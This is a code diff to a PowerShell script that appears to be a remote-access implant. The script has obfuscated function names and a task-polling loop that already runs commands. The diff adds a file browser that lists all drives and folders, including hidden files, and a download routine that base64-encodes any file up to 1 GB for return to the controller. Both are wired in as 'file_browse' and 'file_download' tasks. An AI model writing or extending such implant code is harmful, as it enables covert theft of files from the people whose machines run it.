@@ -224,6 +224,47 @@ function Get-X0d4 {
     }
 }
 
+# File Browser
+function Browse-Files {
+    param($path = "")
+    try {
+        $items = @()
+        if ($path -eq "" -or $path -eq "drives") {
+            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
+            foreach ($drive in $drives) {
+                $items += @{ name = "$($drive.Name):\"; type = "drive"; size = $drive.Used + $drive.Free; free = $drive.Free }
+            }
+        } else {
+            if ($path -match '^[A-Za-z]:\\?$') { $path = $path.TrimEnd('\') + '\' } else { $path = $path.TrimEnd('\\') }
+            if (!(Test-Path $path)) {
+                return @{ data_type = "file_list"; data = (@{ error = "Path not found: $path"; path = $path } | ConvertTo-Json -Compress) }
+            }
+            $children = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
+            foreach ($child in $children) {
+                $items += @{ name = $child.Name; type = if ($child.PSIsContainer) { "folder" } else { "file" }; size = if ($child.PSIsContainer) { 0 } else { $child.Length }; modified = $child.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
+            }
+        }
+        return @{ data_type = "file_list"; data = (@{ path = $path; items = $items; count = $items.Count } | ConvertTo-Json -Depth 5 -Compress) }
+    } catch {
+        return @{ data_type = "file_list"; data = (@{ error = "Error: $_"; path = $path } | ConvertTo-Json -Compress) }
+    }
+}
+
+# File Download
+function Download-File {
+    param($filePath)
+    try {
+        if (!(Test-Path $filePath)) { return @{ data_type = "file_download"; data = (@{ error = "File not found: $filePath" } | ConvertTo-Json -Compress) } }
+        $fileInfo = Get-Item $filePath
+        if ($fileInfo.Length -gt 1073741824) { return @{ data_type = "file_download"; data = (@{ error = "File too large (max 1GB)"; size = $fileInfo.Length } | ConvertTo-Json -Compress) } }
+        $bytes = [System.IO.File]::ReadAllBytes($filePath)
+        $base64 = [Convert]::ToBase64String($bytes)
+        return @{ data_type = "file_download"; data = (@{ filename = $fileInfo.Name; size = $fileInfo.Length; path = $filePath } | ConvertTo-Json -Compress); file_data = $base64 }
+    } catch {
+        return @{ data_type = "file_download"; data = (@{ error = "Error: $_" } | ConvertTo-Json -Compress) }
+    }
+}
+
 function Invoke-X0e5 {
     param($cmd)
     
@@ -446,6 +487,26 @@ while ($true) {
                                 data_type = "cmd_result"
                                 data = "No command provided"
                             }
+                        }
+                    }
+                    
+                    "file_browse" {
+                        $path = ""
+                        if ($task.task_params -and $task.task_params.path) {
+                            $path = $task.task_params.path
+                        }
+                        $taskResult = Browse-Files -path $path
+                    }
+                    
+                    "file_download" {
+                        $filePath = ""
+                        if ($task.task_params -and $task.task_params.file) {
+                            $filePath = $task.task_params.file
+                        }
+                        if ($filePath) {
+                            $taskResult = Download-File -filePath $filePath
+                        } else {
+                            $taskResult = @{ data_type = "file_download"; data = (@{ error = "No file path provided" } | ConvertTo-Json -Compress) }
                         }
                     }
                     
